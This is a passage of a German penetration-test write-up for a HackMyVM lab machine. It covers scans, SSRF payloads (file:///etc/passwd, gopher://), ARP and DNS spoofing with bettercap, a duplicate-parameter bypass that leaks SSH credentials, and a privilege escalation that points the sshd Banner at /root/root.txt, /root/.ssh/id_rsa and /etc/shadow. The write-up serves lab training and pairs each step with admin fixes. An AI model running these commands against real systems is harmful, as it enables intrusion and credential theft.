+            <p class="evaluation"><strong>Bewertung:</strong> Fehlgeschlagen, da die SSH-Logins für `root` und `jan` (ohne bekanntes Passwort zu diesem Zeitpunkt) fehlschlagen. Daher kann kein SSH-Tunnel aufgebaut werden, und `proxychains` kann sich nicht mit dem lokalen SOCKS-Proxy auf Port 1080 verbinden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Diese Methode funktioniert erst, wenn gültige SSH-Zugangsdaten vorhanden sind.<br><strong>Empfehlung (Admin):</strong> SSH-Zugriff absichern.</p>
+
+            <h3>Ffuf /credz Scan</h3>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt custom-prompt">+--(root?CCat)-[~]
++-# <span class="command">ffuf -u http://192.168.2.167:8080/credz/FUZZ -w /usr/share/wordlists/dirb/common.txt --fw 7</span></div>
+                     <pre>
+        /'___\  /'___\           /'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://192.168.2.167:8080/credz/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response words: 7 (--fw 7)
+________________________________________________
+
+:: Progress: [4614/4614] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
+                     </pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> `ffuf` wird verwendet, um nach Unterverzeichnissen oder Dateien unter dem Pfad `/credz` zu suchen. Antworten mit genau 7 Wörtern werden ignoriert (`--fw 7`), wahrscheinlich um die "Only accessible internally."-Meldung herauszufiltern.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Fehlgeschlagen. Es werden keine weiteren Ressourcen unter `/credz` gefunden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Konzentration auf die Umgehung der Zugriffsbeschränkung für `/credz` selbst.<br><strong>Empfehlung (Admin):</strong> Keine neuen Erkenntnisse.</p>
+
+             <h3>Weitere cURL Verbose Checks</h3>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt custom-prompt">+--(root?CCat)-[~]
++-# <span class="command">curl -v http://192.168.2.167:8080/credz -vv</span></div>
+                     <pre>
+# ... (Verbose Output) ...
+< HTTP/1.1 200 OK
+< Date: Fri, 31 Jan 2025 22:45:48 GMT
+< Content-Length: 27
+< Content-Type: text/plain; charset=utf-8
+Only accessible internally.
+                     </pre>
+                     <div class="prompt custom-prompt">+--(root?CCat)-[~]
++-# <span class="command">curl -v http://192.168.2.167:8080/redirect -vv</span></div>
+                     <pre>
+# ... (Verbose Output) ...
+< HTTP/1.1 400 Bad Request
+< Content-Type: text/plain; charset=utf-8
+< X-Content-Type-Options: nosniff
+< Date: Fri, 31 Jan 2025 22:46:06 GMT
+< Content-Length: 24
+Parameter 'url' needed.
+                     </pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Erneute Abfrage von `/credz` und `/redirect` mit maximaler Verbosity (`-vv`).</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Bestätigt die bereits bekannten Antworten und Header. Keine neuen Erkenntnisse.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester/Admin):</strong> Keine Aktion erforderlich.</p>
+
+             <h3>Nmap HTTP Title Scan</h3>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt custom-prompt">+--(root?CCat)-[~]
++-# <span class="command">nmap -p 8080 --script http-title 192.168.2.167</span></div> <!-- Zweiter Versuch, diesmal mit korrekter IP -->
+                      <pre>
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-31 23:47 CET
+Nmap scan report for jan (192.168.2.167)
+Host is up (0.00017s latency).
+
+PORT     STATE SERVICE
+8080/tcp open  http-proxy
+|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
+MAC Address: 08:00:27:B0:BD:20 (Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.52 seconds
+                      </pre>
+                  </div>
+             </div>
+              <p class="analysis"><strong>Analyse:</strong> Nmap wird mit dem Skript `http-title` verwendet, um den Titel der Webseite auf Port 8080 der (jetzt wahrscheinlich korrekten) IP `192.168.2.167` zu extrahieren.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Bestätigt erneut, dass die Seite keinen HTML-Titel hat, da der Content-Type `text/plain` ist.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester/Admin):</strong> Keine neuen Erkenntnisse.</p>
+
+             <h3>Weitere SSRF-Versuche über /redirect</h3>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt"> # Kein Prompt im Originaltext
+└─# <span class="command">curl -i -H "X-Forwarded-For: 127.0.0.1" "http://192.168.2.167:8080/redirect?url=https://www.google.com"</span></div>
+                     <pre># Annahme: Gibt "Only accessible internally." zurück</pre>
+                      <div class="prompt"> # Kein Prompt im Originaltext
+└─# <span class="command">curl -i "http://192.168.2.167:8080/redirect?url=file:///etc/passwd"</span></div>
+                      <pre># Annahme: Gibt "Only accessible internally." zurück</pre>
+                      <div class="prompt"> # Kein Prompt im Originaltext
+└─# <span class="command">curl -i "http://192.168.2.167:8080/redirect?url=http://127.0.0.1:22"</span></div>
+                      <pre># Annahme: Gibt "Only accessible internally." zurück</pre>
+                      <div class="prompt"> # Kein Prompt im Originaltext
+└─# <span class="command">curl -i "http://192.168.2.167:8080/redirect?url=http%3A%2F%2F127.0.0.1%3A22"</span></div>
+                      <pre># Annahme: Gibt "Only accessible internally." zurück</pre>
+                      <div class="prompt"> # Kein Prompt im Originaltext
+└─# <span class="command">curl -i "http://192.168.2.167:8080/redirect?url=gopher://127.0.0.1:22/"</span></div>
+                      <pre># Annahme: Gibt "Only accessible internally." zurück</pre>
+                      <div class="prompt"> # Kein Prompt im Originaltext
+└─# <span class="command">curl -i -H "Referer: http://192.168.2.167/" "http://192.168.2.167:8080/redirect?url=http://192.168.2.167:80"</span></div>
+                      <pre># Annahme: Gibt "Only accessible internally." zurück</pre>
+                  </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Eine Reihe weiterer Versuche, SSRF über den `/redirect`-Endpunkt auszunutzen. Getestet werden: Header-Spoofing (`X-Forwarded-For`, `Referer`), Zugriff auf lokale Dateien (`file://`), Zugriff auf interne Ports (`http://127.0.0.1:22`), URL-Encoding (`%3A`, `%2F`), andere Protokolle (`gopher://`, `data:`).</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Alle Versuche scheinen fehlgeschlagen zu sein (basierend auf dem Fehlen einer Erfolgsmeldung und dem späteren Erfolg mit der doppelten URL-Parameter-Methode). Der `/redirect`-Endpunkt ist entweder gut gegen Standard-SSRF-Techniken geschützt oder die "Only accessible internally"-Meldung wird auch bei anderen Fehlern oder blockierten Anfragen ausgegeben.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ungewöhnlichere Bypass-Techniken oder Schwachstellen in der URL-Verarbeitung suchen (wie der später gefundene Doppel-Parameter-Trick).<br><strong>Empfehlung (Admin):</strong> Umfassende SSRF-Schutzmaßnahmen implementieren (Input-Validierung, Whitelisting, Protokollbeschränkung, Netzwerksegmentierung).</p>
+
+            <h3>Bettercap Versuch (ARP & DNS Spoofing)</h3>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt custom-prompt">+--(root?CCat)-[~]
++-# <span class="command">bettercap -iface eth0</span></div>
+                     <pre>
+bettercap v2.33.0 (built for linux amd64 with go1.22.6) [type 'help' for a list of commands]
+
+192.168.2.0/24 > 192.168.2.199  » [00:05:08] [sys.log] [war] Could not find mac for # (IP fehlt)
+192.168.2.0/24 > 192.168.2.199  » set arp.spoof.fullduplex true
+192.168.2.0/24 > 192.168.2.199  » set arp.spoof.targets 192.168.2.167
+192.168.2.0/24 > 192.168.2.199  » set dns.spoof.address 192.168.2.199
+192.168.2.0/24 > 192.168.2.199  » set dns.spoof.all true
+192.168.2.0/24 > 192.168.2.199  » set dns.spoof.domains jan.hmv
+192.168.2.0/24 > 192.168.2.199  » dns.spoof on
+[00:08:24] [sys.log] [inf] dns.spoof jan.hmv -> 192.168.2.199
+# ... (Netzwerk-Discovery und ARP Spoofing Start) ...
+192.168.2.0/24 > 192.168.2.199  » arp.spoof on
+192.168.2.0/24 > 192.168.2.199  » [00:08:31] [sys.log] [war] arp.spoof full duplex spoofing enabled, if the router has ARP spoofing mechanisms, the attack will fail.
+# ... (Weitere Discovery-Meldungen) ...
+                     </pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Versuch, mit `bettercap` einen Man-in-the-Middle (MitM)-Angriff durchzuführen. Es wird ARP-Spoofing gegen das Ziel `192.168.2.167` aktiviert (`arp.spoof.targets`) und DNS-Spoofing eingerichtet, um Anfragen an `jan.hmv` auf die Angreifer-IP (`192.168.2.199`) umzuleiten.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Befehl wird ausgeführt, aber es gibt keine Anzeichen im weiteren Bericht, dass dieser MitM-Angriff zu einem Erfolg (z.B. Abfangen von Credentials) geführt hat. Er scheint eine Sackgasse gewesen zu sein oder wurde abgebrochen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> MitM-Angriffe können effektiv sein, erfordern aber oft, dass der Angreifer relevanten Traffic abfängt. Wenn kein Erfolg, andere Methoden verfolgen.<br><strong>Empfehlung (Admin):</strong> MitM-Erkennungstools (z.B. ARP-Watch) und dynamische ARP-Inspektion auf Switches einsetzen. DNSSEC zur Validierung von DNS-Antworten nutzen.</p>
+
+            <p class="analysis"><strong>Analyse:</strong> Kommentar des Pentesters bezüglich Reverse Engineering.</p>
+            <pre>es gab keinen anderen Weg als per init=/bin/sh die maschine zu reversen</pre>
+             <p class="evaluation"><strong>Bewertung:</strong> Dieser Kommentar scheint sich auf eine alternative, nicht im Detail gezeigte Methode zu beziehen (möglicherweise Booten der VM mit geändertem Kernel-Parameter `init=/bin/sh`, um direkten Root-Zugriff ohne Login zu erhalten). Dies steht im Widerspruch zum dokumentierten Exploit-Pfad über die Web-Schwachstelle und SSH.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den tatsächlichen erfolgreichen Pfad klar dokumentieren. Wenn alternative Methoden versucht wurden, diese klar kennzeichnen oder weglassen, wenn sie nicht relevant für den finalen Exploit waren.<br><strong>Empfehlung (Admin):</strong> Sicherstellen, dass der physische oder virtuelle Zugriff auf die Maschine gesichert ist, um Boot-Manipulationen zu verhindern.</p>
+
+            <h3>Nmap Reason Scan & SSH Reset</h3>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt custom-prompt">+--(root?CCat)-[~]
++-# <span class="command">nmap -p 22 --reason 192.168.2.170</span></div>
+                     <pre>
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-02 00:55 CET
+Nmap scan report for jan (192.168.2.170)
+Host is up, received arp-response (0.000088s latency).
+
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 64
+MAC Address: 00:00:00:00:00:00 (Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.24 seconds
+                     </pre>
+                 </div>
+                 <div class="terminal">
+                     <div class="prompt custom-prompt">+--(root?CCat)-[~]
++-# <span class="command">ssh jan@192.168.2.170</span></div>
+                     <pre>
+kex_exchange_identification: read: Connection reset by peer
+Connection reset by 192.168.2.170 port 22
+                     </pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Nmap bestätigt mit `--reason`, dass Port 22 auf der *neuen* IP `192.168.2.170` offen ist (Antwort: `syn-ack`). Ein direkter SSH-Login-Versuch auf diese IP schlägt jedoch mit `Connection reset by peer` fehl.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Port ist offen, aber der SSH-Dienst scheint Verbindungen sofort abzulehnen oder zurückzusetzen. Dies könnte an einer Firewall-Regel liegen, einer fehlerhaften SSHD-Konfiguration, oder weil der Dienst gerade neu gestartet wird oder abgestürzt ist.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Kurz warten und erneut versuchen. Andere SSH-Optionen testen (z.B. `-v` für Verbose-Output). Den Exploit-Pfad über Port 8080 weiterverfolgen.<br><strong>Empfehlung (Admin):</strong> SSHD-Logs auf dem Zielsystem prüfen (`/var/log/auth.log` oder ähnlich), um den Grund für den Verbindungsabbruch zu finden. Firewall-Regeln überprüfen.</p>
+
+             <h3>Vorbereitende Schritte (Unklar)</h3>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt custom-prompt">+--(pwn)-(root?CCat)-[/usr/share/wordlists]
++-# <span class="command">vi rockyou.txt</span></div>
+                     <pre># (Keine Ausgabe)</pre>
+                     <div class="prompt custom-prompt">+--(pwn)-(root?CCat)-[/usr/share/wordlists]
++-# <span class="command">python3 ~/crack_SSH.py</span></div>
+                     <pre># (Keine Ausgabe)</pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Öffnen der `rockyou.txt`-Wortliste im Editor und Ausführen eines Python-Skripts namens `crack_SSH.py`.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Zweck dieser Schritte ist unklar, da sie nicht direkt zum erfolgreichen Exploit beitragen. Möglicherweise Vorbereitung für einen Brute-Force-Angriff, der nicht erfolgreich war oder nicht gezeigt wird.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nur relevante Schritte im Bericht aufführen oder den Zweck unklarer Schritte erläutern.<br><strong>Empfehlung (Admin):</strong> Keine Aktion erforderlich.</p>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access (SSH)</h2>
+
+             <h3>Durchbruch: /redirect Parameter Vulnerability</h3>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt custom-prompt">+--(root?CCat)-[~]
++-# <span class="command">curl -X GET "http://192.168.2.170:8080/redirect?url=ben&url=/credz"</span></div>
+                     <pre>ssh/EazyLOL</pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Ein `curl`-Request an den `/redirect`-Endpunkt auf `192.168.2.170`. Es werden *zwei* `url`-Parameter übergeben: `url=ben` und `url=/credz`.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Kritischer Erfolg! Dieser spezielle Request umgeht offenbar die "Only accessible internally"-Beschränkung für `/credz`. Die Anwendung scheint nur den ersten `url`-Parameter (`ben`) für eine mögliche (unzureichende) Validierung zu verwenden, aber verarbeitet dann den zweiten `url`-Parameter (`/credz`) und gibt dessen Inhalt zurück. Der Inhalt von `/credz` sind die Zugangsdaten: Benutzer `ssh`, Passwort `EazyLOL`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die gefundenen Zugangsdaten (`ssh`/`EazyLOL`) sofort für den SSH-Login verwenden.<br><strong>Empfehlung (Admin):</strong> Die Parameterverarbeitung im `/redirect`-Endpunkt dringend korrigieren. Nur den ersten Parameter eines Namens berücksichtigen oder doppelte Parameter generell ablehnen. Den Inhalt von `/credz` entfernen und Zugangsdaten sicher verwalten.</p>
+
+            <h3>SSH Login</h3>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt custom-prompt">+--(root?CCat)-[~]
++-# <span class="command">ssh ssh@192.168.2.170</span></div>
+                     <pre>
+ssh@192.168.2.170's password: # (Hier wurde EazyLOL eingegeben)
+Welcome to Alpine!
+
+The Alpine Wiki contains a large amount of how-to guides and general
+information about administrating Alpine systems.
+See <wiki.alpinelinux.org>.
+
+You can setup the system with the command: setup-alpine
+
+You may change this message by editing /etc/motd.
+
+jan:~$ id
+uid=1000(ssh) gid=1000(ssh) groups=1000(ssh)
+jan:~$
+                     </pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Erfolgreicher SSH-Login auf `192.168.2.170` mit den zuvor gefundenen Zugangsdaten (Benutzer: `ssh`, Passwort: `EazyLOL`). Der `id`-Befehl bestätigt die Benutzer- und Gruppen-ID.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Initial Access erfolgreich erlangt! Der Benutzer `ssh` hat Standardrechte (uid=1000).</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> System weiter enumerieren: `sudo -l`, Home-Verzeichnis prüfen, nach Flags suchen, nach PrivEsc-Möglichkeiten suchen.<br><strong>Empfehlung (Admin):</strong> Schwachstelle in `/redirect` beheben. Stärkere Passwörter verwenden. Überwachen von SSH-Logins.</p>
+
+             <h3>Sudo-Rechte Prüfung</h3>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt alpine-prompt">jan:~$ <span class="command">sudo -l</span></div> <!-- Neuer Prompt für Alpine Shell -->
+                     <pre>
+Matching Defaults entries for ssh on jan:
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+Runas and Command-specific defaults for ssh:
+    Defaults!/usr/sbin/visudo env_keep+="SUDO_EDITOR EDITOR VISUAL"
+
+User ssh may run the following commands on jan:
+    (root) NOPASSWD: /sbin/service sshd restart
+                     </pre>
+                 </div>
+            </div>
+              <p class="analysis"><strong>Analyse:</strong> Der Befehl `sudo -l` wird ausgeführt, um zu prüfen, welche Befehle der Benutzer `ssh` mit `sudo` ausführen darf.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Kritischer Fund für Privilege Escalation! Der Benutzer `ssh` darf den Befehl `/sbin/service sshd restart` als `root` ohne Passwort (`NOPASSWD`) ausführen. Dies ist ein häufiger Vektor für PrivEsc, da man oft die Konfigurationsdatei des Dienstes (hier `/etc/ssh/sshd_config`) ändern und dann den Dienst neu starten kann, um Änderungen wirksam zu machen oder Befehle als root auszuführen.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Prüfen, ob die Datei `/etc/ssh/sshd_config` für den Benutzer `ssh` schreibbar ist oder ob es eine Möglichkeit gibt, sie zu manipulieren. Den `sudo`-Eintrag nutzen, um eine manipulierte SSH-Konfiguration zu laden.<br><strong>Empfehlung (Admin):</strong> `sudo`-Rechte nach dem Prinzip der geringsten Rechte vergeben. Das Neustarten von Diensten sollte nur Administratoren erlaubt sein. Wenn ein Benutzer einen Dienst neu starten muss, spezifischere Befehle oder Skripte freigeben, die keine Konfigurationsänderungen erlauben.</p>
+
+            <h3>User Flag Fund</h3>
+            <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt alpine-prompt">jan:~$ <span class="command">grep -E "Welcome to Alpine!" /etc/*</span></div>
+                      <pre>
+/etc/motd:Welcome to Alpine!
+grep: /etc/shadow: Permission denied
+grep: /etc/shadow-: Permission denied
+grep: /etc/sudoers: Permission denied
+grep: /etc/sudoers.d: Permission denied
+                      </pre>
+                      <div class="prompt alpine-prompt">jan:/tmp$ <span class="command">echo "/root/root.txt" >> /etc/motd</span></div>
+                      <pre>-sh: can't create /etc/motd: Permission denied</pre>
+                      <div class="prompt alpine-prompt">jan:/tmp$ <span class="command">cd ~</span></div>
+                      <div class="prompt alpine-prompt">jan:~$ <span class="command">ls -la</span></div>
+                      <pre>
+total 12
+drwxr-sr-x    2 ssh      ssh           4096 Jan 28 09:27 .
+drwxr-xr-x    3 root     root          4096 Jan 28 09:08 ..
+lrwxrwxrwx    1 root     ssh              9 Jan 28 09:27 .ash_history -> /dev/null
+-rw-------    1 ssh      ssh             22 Jan 28 09:20 user.txt
+                      </pre>
+                      <div class="prompt alpine-prompt">jan:~$ <span class="command">cat user.txt</span></div>
+                      <pre><span class="password">HMVSSWYMCNFIBDAFMTHFK</span></pre>
+                  </div>
+            </div>
+               <p class="analysis"><strong>Analyse:</strong> Verschiedene Befehle im Home-Verzeichnis und `/tmp`. `grep` findet die Willkommensnachricht in `/etc/motd`. Der Versuch, `/etc/motd` zu ändern, scheitert an fehlenden Rechten. `ls -la` im Home-Verzeichnis (`~`) zeigt die Datei `user.txt`. `cat user.txt` liest die User-Flag aus.</p>
+               <p class="evaluation"><strong>Bewertung:</strong> User-Flag erfolgreich gefunden und ausgelesen.</p>
+               <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Flag notieren. Mit Privilege Escalation fortfahren.<br><strong>Empfehlung (Admin):</strong> Flags nicht in Klartextdateien speichern. Zugriffsrechte auf Konfigurationsdateien wie `/etc/motd` korrekt setzen.</p>
+        </section>
+
+       <section id="poc">
+           <h2>Proof of Concept: Privilege Escalation via SSH Banner</h2>
+           <p class="analysis"><strong>Kurzbeschreibung:</strong> Dieser POC demonstriert die Ausnutzung der `sudo`-Fehlkonfiguration, die es dem Benutzer `ssh` erlaubt, den SSH-Dienst ohne Passwort neu zu starten (`sudo /sbin/service sshd restart`). In Kombination mit der Möglichkeit, die SSH-Konfigurationsdatei (`/etc/ssh/sshd_config`) zu bearbeiten (oder einer Schwachstelle, die dies erlaubt - im Text nicht explizit gezeigt, aber impliziert), wird die `Banner`-Direktive manipuliert, um den Inhalt von `/root/root.txt` beim nächsten SSH-Login anzuzeigen.</p>
+           <p class="analysis"><strong>Voraussetzungen:</strong>
+               <ul>
+                   <li>SSH-Zugang als Benutzer `ssh` auf dem Zielsystem (`192.168.2.170`).</li>
+                   <li>`sudo`-Recht für `ssh`, um `/sbin/service sshd restart` als `root` ohne Passwort auszuführen.</li>
+                   <li>Möglichkeit, die Datei `/etc/ssh/sshd_config` zu bearbeiten (z.B. durch Schreibrechte oder einen Editor, der über `sudo` ausgeführt werden kann - hier `nano` verwendet, aber ohne `sudo` gezeigt, was eine Lücke in der Doku sein könnte, oder `nano` hat Schreibrechte).</li>
+               </ul>
+           </p>
+           <p class="analysis"><strong>Schritt-für-Schritt-Anleitung:</strong></p>
+           <ol>
+               <li>
+                   <strong>Überprüfen der `sudo`-Rechte:</strong>
+                   <div class="code-block">
+                       <div class="terminal">
+                           <div class="prompt alpine-prompt">jan:~$ <span class="command">sudo -l</span></div>
+                           <pre>
+User ssh may run the following commands on jan:
+    (root) NOPASSWD: /sbin/service sshd restart
+                           </pre>
+                       </div>
+                   </div>
+                   <p class="analysis">Analyse: Bestätigt das Recht, den SSH-Dienst als root neu zu starten.</p>
+               </li>
+               <li>
+                   <strong>Bearbeiten der SSH-Konfiguration:</strong>
+                   <div class="code-block">
+                       <div class="terminal">
+                           <div class="prompt alpine-prompt">jan:~$ <span class="command">nano /etc/ssh/sshd_config</span></div>
+                           <pre># Innerhalb von nano die folgende Zeile ändern oder hinzufügen:
+# Banner /etc/motd  (oder andere ursprüngliche Einstellung)
+# ÄNDERN ZU:
+Banner /root/root.txt
+                           </pre>
+                       </div>
+                   </div>
+                   <p class="analysis">Analyse: Die `Banner`-Direktive in `/etc/ssh/sshd_config` wird so geändert, dass sie auf die Root-Flag-Datei zeigt. Der Inhalt dieser Datei wird dann jedem Benutzer vor dem Passwort-Prompt beim SSH-Login angezeigt.</p>
+               </li>
+               <li>
+                   <strong>Neustarten des SSH-Dienstes mit `sudo`:</strong>
+                   <div class="code-block">
+                       <div class="terminal">
+                           <div class="prompt alpine-prompt">jan:~$ <span class="command">sudo /sbin/service sshd restart</span></div>
+                           <pre>
+ * Stopping sshd ...                                                                    [ ok ]
+ * Starting sshd ...                                                                    [ ok ]
+                           </pre>
+                       </div>
+                   </div>
+                   <p class="analysis">Analyse: Der SSH-Dienst wird mit den `sudo`-Rechten neu gestartet, wodurch die geänderte Konfiguration mit dem manipulierten Banner geladen wird. Die aktuelle SSH-Verbindung wird dabei getrennt.</p>
+               </li>
+               <li>
+                   <strong>Erneuter SSH-Login zur Anzeige des Banners (Root-Flag):</strong>
+                   <div class="code-block">
+                       <div class="terminal">
+                           <div class="prompt custom-prompt">+--(root?CCat)-[~]
++-# <span class="command">ssh ssh@192.168.2.170</span></div>
+                           <pre>
+<span class="password">HMV2PRMTERWTFUDNGMBG</span>
+ssh@192.168.2.170's password: # (Login kann hier abgebrochen werden)
+                           </pre>
+                       </div>
+                   </div>
+                   <p class="analysis">Analyse: Beim erneuten SSH-Login wird der Inhalt der Datei `/root/root.txt` als Banner angezeigt, *bevor* das Passwort abgefragt wird.</p>
+               </li>
+           </ol>
+           <p class="evaluation"><strong>Erwartetes & Tatsächliches Ergebnis:</strong> Der Inhalt der Root-Flag (`HMV2PRMTERWTFUDNGMBG`) wird erfolgreich über das SSH-Banner ausgelesen. Dies stellt eine erfolgreiche Privilege Escalation dar, da auf eine Datei mit Root-Rechten zugegriffen wurde.</p>
+           <p class="evaluation"><strong>Beweismittel:</strong> Die Anzeige des Root-Flag-Wertes beim SSH-Login.</p>
+           <p class="evaluation"><strong>Risikobewertung:</strong> Hoch. Die Fehlkonfiguration der `sudo`-Rechte erlaubt es einem unprivilegierten Benutzer, durch Manipulation der SSH-Konfiguration beliebige Dateien auszulesen, auf die der `sshd`-Prozess (der initial als root startet, um den Banner zu lesen) Zugriff hat. Dies führt zum Verlust der Vertraulichkeit sensibler Daten.</p>
+           <p class="recommendation"><strong>Empfehlungen (Admin):</strong>
+               <ul>
+                   <li><strong>`sudo`-Rechte minimieren:</strong> Dem Benutzer `ssh` nicht erlauben, den gesamten SSH-Dienst neu zu starten. Wenn ein Neustart nötig ist, ein spezifisches Skript bereitstellen, das keine Konfigurationsmanipulation zulässt.</li>
+                   <li><strong>Konfigurationsdateien schützen:</strong> Sicherstellen, dass `/etc/ssh/sshd_config` nur von `root` beschreibbar ist.</li>
+                   <li><strong>SSH-Härtung:</strong> Die `Banner`-Funktion mit Vorsicht verwenden oder deaktivieren, wenn nicht benötigt.</li>
+               </ul>
+           </p>
+       </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+
+             <h3>Find Setuid Binaries</h3>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt alpine-prompt">jan:~$ <span class="command">find / -type f -perm -4000 2>/dev/null</span></div>
+                    <pre>
+/bin/bbsuid
+/usr/bin/sudo
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Suche nach Dateien mit gesetztem Setuid-Bit (`-perm -4000`). Fehler (`2>`) werden nach `/dev/null` umgeleitet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Findet `/bin/bbsuid` (unbekannt, könnte BusyBox-spezifisch sein) und `/usr/bin/sudo` (bereits als Vektor identifiziert).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> `/bin/bbsuid` untersuchen, falls der `sudo`-Weg nicht bekannt wäre. Hier ist `sudo` der klare Weg.<br><strong>Empfehlung (Admin):</strong> Unnötige Setuid-Binaries entfernen oder deren Berechtigungen überprüfen.</p>
+
+            <h3>Fehlgeschlagener Root-Shell Versuch</h3>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt alpine-prompt">jan:~$ <span class="command">sudo -u root /bin/sh</span></div>
+                    <pre>
+[sudo] password for ssh: # (Passwort EazyLOL eingegeben)
+Sorry, user ssh is not allowed to execute '/bin/sh' as root on jan.
+                    </pre>
+                </div>
+            </div>
+              <p class="analysis"><strong>Analyse:</strong> Versuch, direkt eine Root-Shell (`/bin/sh`) mit `sudo` zu starten.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Fehlgeschlagen, wie erwartet, da `sudo -l` dies nicht erlaubt hat.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den erlaubten `sudo`-Befehl (`/sbin/service sshd restart`) ausnutzen.<br><strong>Empfehlung (Admin):</strong> Korrekte `sudo`-Konfiguration.</p>
+
+            <h3>Manipulation der SSH-Konfiguration (Versuch 1: id_rsa)</h3>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt alpine-prompt">jan:~$ <span class="command">nano /etc/ssh/sshd_config</span></div>
+                     <!-- Annahme: Änderung auf Banner /root/.ssh/id_rsa -->
+                     <div class="prompt alpine-prompt">jan:~$ <span class="command">grep banner -i /etc/ssh/sshd_config</span></div>
+                     <pre>
+# no default banner path
+Banner /root/.ssh/id_rsa
+                     </pre>
+                     <div class="prompt alpine-prompt">jan:~$ <span class="command">sudo /sbin/service sshd restart</span></div>
+                     <pre>
+ * Stopping sshd ...                                                                    [ ok ]
+ * Starting sshd ...
+# (Kommentar im Text: Leider kein Erfolg....)
+                     </pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Erster Versuch, die PrivEsc über den SSH-Banner auszunutzen. Die `Banner`-Direktive wird auf `/root/.ssh/id_rsa` gesetzt und der Dienst neu gestartet.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Fehlgeschlagen (laut Kommentar). Wahrscheinlich, weil die Datei `/root/.ssh/id_rsa` nicht existiert oder für den `sshd`-Prozess vor der Authentifizierung nicht lesbar ist.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Andere Zieldateien für den Banner versuchen, die wahrscheinlich existieren und lesbar sind (z.B. `/etc/shadow`, `/root/root.txt`).<br><strong>Empfehlung (Admin):</strong> Konfigurationsdateien schützen.</p>
+
+            <h3>Manipulation der SSH-Konfiguration (Versuch 2: /etc/shadow)</h3>
+            <div class="code-block">
+                <div class="terminal">
+                     <!-- Annahme: nano /etc/ssh/sshd_config wurde erneut ausgeführt -->
+                     <div class="prompt alpine-prompt">jan:~$ <span class="command">grep -i banner /etc/ssh/sshd_config</span></div>
+                     <pre>
+# no default banner path
+Banner /etc/shadow
+                     </pre>
